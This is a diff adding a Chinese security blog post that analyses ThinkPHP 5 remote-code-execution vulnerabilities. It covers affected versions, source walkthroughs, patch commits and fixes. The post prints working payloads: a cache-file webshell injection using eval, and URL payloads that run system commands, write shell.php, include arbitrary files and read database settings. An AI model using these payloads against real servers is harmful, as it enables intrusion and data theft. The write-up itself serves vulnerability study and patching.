@@ -1,0 +1,1956 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="[PHP代码审计]TP5漏洞--RCE, 会下雪的晴天">
+    <meta name="description" content="The best way to know your strength is to fight">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>[PHP代码审计]TP5漏洞--RCE | 会下雪的晴天</title>
+    <link rel="icon" type="image/x-icon, image/vnd.microsoft.icon" href="/favicon.ico">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+
+    <script src="/libs/jquery/jquery.min.js"></script>
+
+<meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="会下雪的晴天" type="application/atom+xml">
+
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+</head>
+
+
+
+   <style>
+    body{
+       background-image: url(https://raw.githubusercontent.com/yq1ng/blog/master/friedds/20211201133159.jpg);
+       background-repeat:no-repeat;
+       background-size:cover;
+       background-attachment:fixed;
+    }
+</style>
+
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <span class="logo-span">会下雪的晴天</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>留言板</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友情链接</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <div class="logo-name">会下雪的晴天</div>
+        <div class="logo-desc">
+            
+            The best way to know your strength is to fight
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			留言板
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友情链接
+		</a>
+          
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/yq1ng" class="waves-effect waves-light" target="_blank">
+                <i class="fab fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/yq1ng" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+    
+<script src="/libs/cryptojs/crypto-js.min.js"></script>
+<script>
+    (function() {
+        let pwd = '';
+        if (pwd && pwd.length > 0) {
+            if (pwd !== CryptoJS.SHA256(prompt('请输入访问本文章的密码')).toString(CryptoJS.enc.Hex)) {
+                alert('密码错误，将返回主页！');
+                location.href = '/';
+            }
+        }
+    })();
+</script>
+
+
+<meta name="referrer" content="no-referrer" />
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/6.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">[PHP代码审计]TP5漏洞--RCE</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        padding: 35px 0 15px 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        padding-bottom: 30px;
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/">
+                                <span class="chip bg-color">...</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/PHP%E5%AE%89%E5%85%A8/" class="post-category">
+                                PHP安全
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2021-07-28
+                </div>
+                
+
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
+                    2021-12-01
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    3.2k
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                    14 分
+                </div>
+                
+
+                
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.css">
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <p>还是先上七月火师傅的文章：<a target="_blank" rel="noopener" href="https://github.com/Mochazz/ThinkPHP-Vuln">ThinkPHP</a></p>
+<p>环境搭建，按版本自行搭建，测试版本在漏洞分析处，只需修改 <code>composer.json</code>，5.0 和 5.1 不能直接composer</p>
+<pre class="line-numbers language-none"><code class="language-none"># v5.0.x
+composer create-project --prefer-dist topthink/think=5.0.15 tpdemo
+将 composer.json 文件的 require 字段设置成如下：
+"require": {
+    "php": "&gt;=5.4.0",
+    "topthink/framework": "5.0.15"
+}
+然后执行 composer update
+# v5.1.x
+composer create-project --prefer-dist topthink/think tpdemo
+将 composer.json 文件的 require 字段设置成如下：
+"require": {
+    "php": "&gt;=5.6.0",
+    "topthink/framework": "5.1.7"
+}
+然后执行 composer update<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>[TOC]</p>
+<a id="more"></a>
+
+<h1 id="RCE-1-（缓存写马）"><a href="#RCE-1-（缓存写马）" class="headerlink" title="RCE 1 （缓存写马）"></a>RCE 1 （缓存写马）</h1><p>这个比较鸡肋，不过还是分析分析，从简单的开始嘛</p>
+<h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>网站通常使用缓存来减小服务器压力，而 thinkphp 在缓存时没有对缓存内容进行检测、过滤且将缓存存在 php 文件中，这就导致攻击者可以构造特殊的缓存内容来控制整个服务器</p>
+<p>漏洞影响版本： <strong>5.0.0&lt;=ThinkPHP5&lt;=5.0.10</strong></p>
+<h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p>之所以说它鸡肋就是因为条件太多了。。。</p>
+<ul>
+<li>站点能列出缓存文件，知道马子路径</li>
+<li>缓存目录需暴露在 web 目录下，可访问</li>
+<li>程序采用默认情况，一旦修改 key 或 设置<code>this-&gt;options['prefix']</code>且没有源码参考那就直接嗝屁</li>
+<li>。。。</li>
+</ul>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>POC：<code>http://127.0.0.1/PHPSec/tp5.0/public/?username=mochazz123%0d%0a@eval($_GET[_]);//</code></p>
+<p><img src="https://raw.githubusercontent.com/yq1ng/blog/master/PHPSec/20210728173718.png" alt="image-20210728173718226"></p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>测试版本：5.0.10</p>
+<p>看 <a target="_blank" rel="noopener" href="https://github.com/top-think/framework/releases/tag/v5.0.11">v5.0.11 releases</a> 说明：<strong>包含了一个安全更新</strong>。接着看 commit ，找到 <a target="_blank" rel="noopener" href="https://github.com/top-think/framework/commit/a217d88e38a0ec2dd33ba9d5fd53ac509f93c91a">改进缓存驱动</a>，此改进直接加上了退出死亡函数，没法利用了</p>
+<p><img src="https://raw.githubusercontent.com/yq1ng/blog/master/PHPSec/20210728171808.png" alt="image-20210728171800911"></p>
+<p><img src="https://raw.githubusercontent.com/yq1ng/blog/master/PHPSec/20210728173412.png" alt="image-20210728173412775"></p>
+<p>打上断点开始吧</p>
+<p><img src="https://raw.githubusercontent.com/yq1ng/blog/master/PHPSec/20210728173917.png" alt="image-20210728173917141"></p>
+<p>由于 <code>Cache::set("name",input("get.username"));</code>未实例化，所以开局会有 <code>Loder.php</code>的自动加载机制，可以不用看</p>
+<p><img src="https://raw.githubusercontent.com/yq1ng/blog/master/PHPSec/20210728174132.png" alt="image-20210728174132535"></p>
+<p>接着来到助手函数，<code>helper.php</code> 的 <code>input()</code> 来获取原始数据，然后是 <code>Request.php</code> 的 <code>get()</code> 方法来获取 get 传入的值</p>
+<p><img src="https://raw.githubusercontent.com/yq1ng/blog/master/PHPSec/20210728174428.png" alt="image-20210728174428244"></p>
+<p>然后 <code>input()</code> 解析、强制转换数据，直接跳了。这就到了<del>~ <code>Cache.php</code>的 <code>set()</code> 写缓存</del> <code>set()</code>前的初始化</p>
+<p><img src="https://raw.githubusercontent.com/yq1ng/blog/master/PHPSec/20210728174647.png" alt="image-20210728174647015"></p>
+<p>跟进去，这里是根据配置来选择不同的缓存操作，默认情况下是缓存 file</p>
+<p><img src="https://raw.githubusercontent.com/yq1ng/blog/master/PHPSec/20210729145459.png" alt="image-20210729145417991"></p>
+<p><img src="https://raw.githubusercontent.com/yq1ng/blog/master/PHPSec/20210729145714.png" alt="image-20210729145714223"></p>
+<p>第 72 行跟进去，看看 <code>connect()</code> ，寻找要缓存的驱动并在断点处（ 51 行）进行实例化，由自动加载器完成</p>
+<p><img src="https://raw.githubusercontent.com/yq1ng/blog/master/PHPSec/20210729150256.png" alt="image-20210729150256042"></p>
+<p>初始化结束后开始写缓存，首先设置缓存有效期，然后进入 <code>getCacheKey($name)</code> 构造缓存文件名</p>
+<p><img src="https://raw.githubusercontent.com/yq1ng/blog/master/PHPSec/20210729150856.png" alt="image-20210729150856779"></p>
+<p>参数值默认为 <code>name</code> ，第一个红框取 md5 加密后的 name 前两位为子目录后面为文件名，如果设置了 <code>$this-&gt;options['prefix']</code>，还会在默认缓存目录前再多一个父目录</p>
+<p><img src="https://raw.githubusercontent.com/yq1ng/blog/master/PHPSec/20210729151107.png" alt="image-20210729151107294"></p>
+<p>在 147 行，由于默认的 <code>$this-&gt;options['data_compress']</code> 为 <code>false</code>所以数据并不会被压缩，原样拼接到 <code>data</code> 里面，然后写入文件，至此缓存写马完成</p>
+<p><img src="https://raw.githubusercontent.com/yq1ng/blog/master/PHPSec/20210729151650.png" alt="image-20210729151649946"></p>
+<p><img src="https://raw.githubusercontent.com/yq1ng/blog/master/PHPSec/20210729151622.png" alt="image-20210729151621882"></p>
+<h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><ul>
+<li>官方修复直接加上了死亡退出</li>
+<li>或者在<code>thinkphp\library\think\cache\driver\File.php -&gt; public function set($name, $value, $expire = null)</code>方法中加上 <code>$data = str_replace(PHP_EOL, ”, $data);</code> 去除换行符以达到不可绕过</li>
+<li>限制目录访问，使得缓存目录不可达</li>
+<li>。。。</li>
+</ul>
+<h1 id="RCE-2-未开启强制路由导致-RCE"><a href="#RCE-2-未开启强制路由导致-RCE" class="headerlink" title="RCE 2 (未开启强制路由导致 RCE )"></a>RCE 2 (未开启强制路由导致 RCE )</h1><p>昨天写的似乎没保存。。。今天重写。</p>
+<p>推荐参考：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3570">tp5 poc 从0到1–水泡泡</a></p>
+<h2 id="漏洞概述-1"><a href="#漏洞概述-1" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>本次漏洞是由于 ThinkPHP 底层未对控制器名进行很好的检测导致在未开启强制路由的情况下可以调用任意类及方法</p>
+<p>漏洞影响版本： <strong>5.0.7&lt;=ThinkPHP5&lt;=5.0.22</strong> 、<strong>5.1.0&lt;=ThinkPHP&lt;=5.1.30</strong></p>
+<h2 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>这个利用就多了</p>
+<p><strong>5.1.x</strong> ：</p>
+<pre class="line-numbers language-none"><code class="language-none">?s=index/\think\Request/input&amp;filter[]=system&amp;data=pwd
+?s=index/\think\view\driver\Php/display&amp;content=&lt;?php phpinfo();?&gt;
+?s=index/\think\template\driver\file/write&amp;cacheFile=shell.php&amp;content=&lt;?php phpinfo();?&gt;
+?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id
+?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><strong>5.0.x</strong> ：</p>
+<pre class="line-numbers language-none"><code class="language-none">?s=index/think\config/get&amp;name=database.username # 获取配置信息
+?s=index/\think\Lang/load&amp;file=../../test.jpg    # 包含任意文件
+?s=index/\think\Config/load&amp;file=../../t.php     # 包含任意.php文件
+?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>两个大版本因加载类不同，payload也会有所不同：</p>
+<pre class="line-numbers language-none"><code class="language-none">ThinkPHP 5.1.x                  ThinkPHP 5.0.x
+stdClass                        stdClass
+Exception                       Exception
+ErrorException                  ErrorException
+Closure                         Closure
+Generator                       Generator
+DateTime                        DateTime
+DateTimeImmutable               DateTimeImmutable
+DateTimeZone                    DateTimeZone
+DateInterval                    DateInterval
+DatePeriod                      DatePeriod
+LibXMLError                     LibXMLError
+DOMException                    DOMException
+DOMStringList                   DOMStringList
+DOMNameList                     DOMNameList
+DOMImplementationList           DOMImplementationList
+DOMImplementationSource         DOMImplementationSource
+DOMImplementation               DOMImplementation
+DOMNode                         DOMNode
+DOMNameSpaceNode                DOMNameSpaceNode
+DOMDocumentFragment             DOMDocumentFragment
+DOMDocument                     DOMDocument
+DOMNodeList                     DOMNodeList
+DOMNamedNodeMap                 DOMNamedNodeMap
+DOMCharacterData                DOMCharacterData
+DOMAttr                         DOMAttr
+DOMElement                      DOMElement
+DOMText                         DOMText
+DOMComment                      DOMComment
+DOMTypeinfo                     DOMTypeinfo
+DOMUserDataHandler              DOMUserDataHandler
+DOMDomError                     DOMDomError
+DOMErrorHandler                 DOMErrorHandler
+DOMLocator                      DOMLocator
+DOMConfiguration                DOMConfiguration
+DOMCdataSection                 DOMCdataSection
+DOMDocumentType                 DOMDocumentType
+DOMNotation                     DOMNotation
+DOMEntity                       DOMEntity
+DOMEntityReference              DOMEntityReference
+DOMProcessingInstruction        DOMProcessingInstruction
+DOMStringExtend                 DOMStringExtend
+DOMXPath                        DOMXPath
+finfo                           finfo
+LogicException                  LogicException
+BadFunctionCallException        BadFunctionCallException
+BadMethodCallException          BadMethodCallException
+DomainException                 DomainException
+InvalidArgumentException        InvalidArgumentException
+LengthException                 LengthException
+OutOfRangeException             OutOfRangeException
+RuntimeException                RuntimeException
+OutOfBoundsException            OutOfBoundsException
+OverflowException               OverflowException
+RangeException                  RangeException
+UnderflowException              UnderflowException
+UnexpectedValueException        UnexpectedValueException
+RecursiveIteratorIterator       RecursiveIteratorIterator
+IteratorIterator                IteratorIterator
+FilterIterator                  FilterIterator
+RecursiveFilterIterator         RecursiveFilterIterator
+CallbackFilterIterator          CallbackFilterIterator
+RecursiveCallbackFilterIterator RecursiveCallbackFilterIterator
+ParentIterator                  ParentIterator
+LimitIterator                   LimitIterator
+CachingIterator                 CachingIterator
+RecursiveCachingIterator        RecursiveCachingIterator
+NoRewindIterator                NoRewindIterator
+AppendIterator                  AppendIterator
+InfiniteIterator                InfiniteIterator
+RegexIterator                   RegexIterator
+RecursiveRegexIterator          RecursiveRegexIterator
+EmptyIterator                   EmptyIterator
+RecursiveTreeIterator           RecursiveTreeIterator
+ArrayObject                     ArrayObject
+ArrayIterator                   ArrayIterator
+RecursiveArrayIterator          RecursiveArrayIterator
+SplFileInfo                     SplFileInfo
+DirectoryIterator               DirectoryIterator
+FilesystemIterator              FilesystemIterator
+RecursiveDirectoryIterator      RecursiveDirectoryIterator
+GlobIterator                    GlobIterator
+SplFileObject                   SplFileObject
+SplTempFileObject               SplTempFileObject
+SplDoublyLinkedList             SplDoublyLinkedList
+SplQueue                        SplQueue
+SplStack                        SplStack
+SplHeap                         SplHeap
+SplMinHeap                      SplMinHeap
+SplMaxHeap                      SplMaxHeap
+SplPriorityQueue                SplPriorityQueue
+SplFixedArray                   SplFixedArray
+SplObjectStorage                SplObjectStorage
+MultipleIterator                MultipleIterator
+SessionHandler                  SessionHandler
+ReflectionException             ReflectionException
+Reflection                      Reflection
+ReflectionFunctionAbstract      ReflectionFunctionAbstract
+ReflectionFunction              ReflectionFunction
+ReflectionParameter             ReflectionParameter
+ReflectionMethod                ReflectionMethod
+ReflectionClass                 ReflectionClass
+ReflectionObject                ReflectionObject
+ReflectionProperty              ReflectionProperty
+ReflectionExtension             ReflectionExtension
+ReflectionZendExtension         ReflectionZendExtension
+__PHP_Incomplete_Class          __PHP_Incomplete_Class
+php_user_filter                 php_user_filter
+Directory                       Directory
+SimpleXMLElement                SimpleXMLElement
+SimpleXMLIterator               SimpleXMLIterator
+SoapClient                      SoapClient
+SoapVar                         SoapVar
+SoapServer                      SoapServer
+SoapFault                       SoapFault
+SoapParam                       SoapParam
+SoapHeader                      SoapHeader
+PharException                   PharException
+Phar                            Phar
+PharData                        PharData
+PharFileInfo                    PharFileInfo
+XMLReader                       XMLReader
+XMLWriter                       XMLWriter
+ZipArchive                      ZipArchive
+PDOException                    PDOException
+PDO                             PDO
+PDOStatement                    PDOStatement
+PDORow                          PDORow
+CURLFile                        CURLFile
+Collator                        Collator
+NumberFormatter                 NumberFormatter
+Normalizer                      Normalizer
+Locale                          Locale
+MessageFormatter                MessageFormatter
+IntlDateFormatter               IntlDateFormatter
+ResourceBundle                  ResourceBundle
+Transliterator                  Transliterator
+IntlTimeZone                    IntlTimeZone
+IntlCalendar                    IntlCalendar
+IntlGregorianCalendar           IntlGregorianCalendar
+Spoofchecker                    Spoofchecker
+IntlException                   IntlException
+IntlIterator                    IntlIterator
+IntlBreakIterator               IntlBreakIterator
+IntlRuleBasedBreakIterator      IntlRuleBasedBreakIterator
+IntlCodePointBreakIterator      IntlCodePointBreakIterator
+IntlPartsIterator               IntlPartsIterator
+UConverter                      UConverter
+JsonIncrementalParser           JsonIncrementalParser
+mysqli_sql_exception            mysqli_sql_exception
+mysqli_driver                   mysqli_driver
+mysqli                          mysqli
+mysqli_warning                  mysqli_warning
+mysqli_result                   mysqli_result
+mysqli_stmt                     mysqli_stmt
+Composer\Autoload\ComposerStaticInit81a0c33d33d83a86fdd976e2aff753d9            Composer\Autoload\ComposerStaticInit8a67cf04fc9c0db5b85a9d897c12a44c
+think\Loader                    think\Loader
+think\Error                     think\Error
+think\Container                 think\Config
+think\App                       think\App
+think\Env                       think\Request
+think\Config                    think\Hook
+think\Hook                      think\Env
+think\Facade                    think\Lang
+think\facade\Env                think\Log
+env                             think\Route
+think\Db
+think\Lang
+think\Request
+think\facade\Route
+route
+think\Route
+think\route\Rule
+think\route\RuleGroup
+think\route\Domain
+think\route\RuleItem
+think\route\RuleName
+think\route\Dispatch
+think\route\dispatch\Url
+think\route\dispatch\Module
+think\Middleware
+think\Cookie
+think\View
+think\view\driver\Think
+think\Template
+think\template\driver\File
+think\Log
+think\log\driver\File
+think\Session
+think\Debug
+think\Cache
+think\cache\Driver
+think\cache\driver\File<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<h2 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>测试版本：5.1.30</p>
+<p>本次环境是 tp 5.1.30，所以去看看 <a target="_blank" rel="noopener" href="https://github.com/top-think/framework/releases/tag/v5.1.31">5.1.31 的 releases</a> 说明及 <a target="_blank" rel="noopener" href="https://github.com/top-think/framework/commit/802f284bec821a608e7543d91126abc5901b2815">commit</a></p>
+<p><img src="https://raw.githubusercontent.com/yq1ng/blog/master/PHPSec/20210801005031.png" alt="image-20210801005030171"></p>
+<p><img src="https://raw.githubusercontent.com/yq1ng/blog/master/PHPSec/20210801005653.png" alt="image-20210801005653569"></p>
